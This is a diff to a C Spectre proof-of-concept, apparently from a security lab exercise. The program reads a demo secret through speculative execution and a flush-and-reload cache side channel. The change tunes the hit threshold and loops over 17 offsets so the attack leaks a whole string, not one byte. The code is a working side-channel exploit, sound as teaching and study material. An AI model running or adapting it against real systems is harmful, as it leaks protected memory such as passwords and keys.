@@ -13,7 +13,7 @@ uint8_t temp    = 0;
 char    *secret = "Some Secret Value";   
 uint8_t array[256*4096];
 
-#define CACHE_HIT_THRESHOLD (80)
+#define CACHE_HIT_THRESHOLD (100)
 #define DELTA 1024
 
 // Sandbox Function
@@ -73,7 +73,10 @@ void spectreAttack(size_t index_beyond)
   //
   // Ask victim() to return the secret in out-of-order execution.
   s = restrictedAccess(index_beyond);
-  array[s*4096 + DELTA] += 88;
+  if (s != 0) {
+    array[s*4096 + DELTA] += 88;
+  }
+  
 }
 
 int main() {
@@ -81,23 +84,30 @@ int main() {
   uint8_t s;
   size_t index_beyond = (size_t)(secret - (char*)buffer);
 
-  flushSideChannel();
-  for(i=0;i<256; i++) scores[i]=0; 
-
-  for (i = 0; i < 1000; i++) {
-    printf("*****\n");  // This seemly "useless" line is necessary for the attack to succeed
-    spectreAttack(index_beyond);
-    usleep(10);
-    reloadSideChannelImproved();
-  }
-
-  int max = 0;
-  for (i = 0; i < 256; i++){
-    if(scores[max] < scores[i]) max = i;
+  
+  
+  int res[20] = {0};
+  for (int j = 0; j < 17; ++j) {
+    flushSideChannel();
+    for(i=0;i<256; i++) scores[i]=0; 
+    for (i = 0; i < 1000; i++) {
+      printf("*****\n");  // This seemly "useless" line is necessary for the attack to succeed
+      spectreAttack(index_beyond + j);
+      usleep(10);
+      reloadSideChannelImproved();
+    }
+    int max = 0;
+    for (i = 0; i < 256; i++){
+      if(scores[max] < scores[i]) max = i;
+    }
+    res[j] = max;
   }
 
   printf("Reading secret value at index %ld\n", index_beyond);
-  printf("The secret value is %d(%c)\n", max, max);
-  printf("The number of hits is %d\n", scores[max]);
+  // printf("The secret value is %d(%c)\n", max, max);
+  printf("The secret value is ");
+  for (int i = 0; i < 17; ++i) printf("%c", res[i]);
+  printf("\n");
+  // printf("The number of hits is %d\n", scores[max]);
   return (0); 
 }
